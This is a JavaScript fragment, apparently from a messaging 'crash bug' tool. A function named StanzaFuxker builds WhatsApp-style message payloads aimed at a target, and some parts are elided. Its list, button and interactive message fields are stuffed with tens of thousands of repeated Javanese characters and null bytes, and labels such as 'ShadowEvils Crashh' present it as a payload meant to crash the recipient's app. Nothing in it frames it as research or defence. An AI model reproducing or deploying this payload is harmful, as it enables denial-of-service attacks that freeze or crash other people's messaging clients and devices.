async function StanzaFuxker(langgxyz, target, ptcp = true) {
  ...
  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "ShadowEvils V5 New 〽🩸" + "ꦽ".repeat(16999), 
          listType: 2,
          singleSelectReply: {
            selectedRowId: "😹",
          },
          contextInfo: {
            ...
            quotedMessage: {
              buttonsMessage: {
                ...
                contentText: 'Dzakyy Is Heree🚀',
                footerText: "Dzakyydev",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(170000),
                    buttonText: {
                      displayText: "ShadowEvils Crashh🩸" + "ꦽ".repeat(1999),
                    },
                    type: 1,
                  },
                  {
        ...
        message: {
          ...
          interactiveMessage: proto.Message.InteractiveMessage.create({
            ...
            body: proto.Message.InteractiveMessage.Body.create({
              text: 'ShadowEvils Crashh🩸' + "ꦽ".repeat(29999),
            }),
